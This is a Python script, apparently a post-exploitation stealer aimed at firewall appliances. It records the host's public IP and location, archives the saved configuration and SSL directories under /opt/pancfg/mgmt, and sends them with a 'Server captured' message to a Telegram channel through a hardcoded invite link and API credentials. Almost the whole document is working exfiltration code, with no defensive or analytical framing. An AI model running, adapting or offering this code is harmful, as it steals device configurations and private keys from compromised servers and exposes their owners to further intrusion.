import subprocess
import importlib
import sys
import hashlib
import os
import io
import tarfile

# Устанавливаем необходимые библиотеки
def install_package(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

def check_and_install_libraries():
    required_libraries = ["requests", "urllib3", "telethon", "asyncio"]
    for lib in required_libraries:
        try:
            importlib.import_module(lib)
        except ImportError:
            print(f"Library {lib} not found, installing...")
            install_package(lib)

from telethon import TelegramClient
import asyncio
# Необходимы для работы в Google Colab
import nest_asyncio
nest_asyncio.apply()
check_and_install_libraries()

# Конфигурация для Telegram
api_id = '7330744500'  # Ваш API ID
api_hash = 'AAHe_rHmqnh3Xcb7ZTieL22OoxWBHV7XFqc'  # Ваш API Hash
session_name = 'checker'
channel_invite_link = 't.me/+ntyPCkOuzIwzZmQ0'  # Канал, в который нужно отправить сообщение

# Отключаем предупреждения
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Функция для отправки в Telegram
async def send_to_telegram(message, files):
    async with TelegramClient(session_name, api_id, api_hash) as client:
        # Получаем сущность канала
        entity = await client.get_entity(channel_invite_link)

        # Отправляем сообщение
        await client.send_message(entity, message)

        # Отправляем файлы
        for file_name, file_data in files.items():
            await client.send_file(entity, file_data, caption=file_name)
        print("Message and files sent successfully!")

# Функция для архивации директории
def archive_directory(directory_path):
    tar_stream = io.BytesIO()
    with tarfile.open(fileobj=tar_stream, mode="w:gz") as tar:
        tar.add(directory_path, arcname=os.path.basename(directory_path))
    tar_stream.seek(0)
    return tar_stream

# Основная функция
def main():
    try:
        # Получаем информацию о текущем IP
        import requests
        ip_info = requests.get("http://ip-api.com/json", verify=False).json()
        ip = ip_info["query"]
        country = ip_info["country"]
        city = ip_info["city"]

        ip_hash = hashlib.sha256(ip.encode("utf-8")).hexdigest()

        # Формируем сообщение
        message = f"🟢 Server captured\n"
        message += f"------------------\n"
        message += f"IP: {ip}\n"
        message += f"Country: {country}\n"
        message += f"City: {city}\n"
        message += f"------------------\n"
        message += f"#{ip_hash[:8]}"

        # Архивируем директории
        files = {
            "saved-configs.tar.gz": archive_directory("/opt/pancfg/mgmt/saved-configs"),
            "ssl.tar.gz": archive_directory("/opt/pancfg/mgmt/ssl"),
        }

        # Отправляем в Telegram
        asyncio.run(send_to_telegram(message, files))

    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
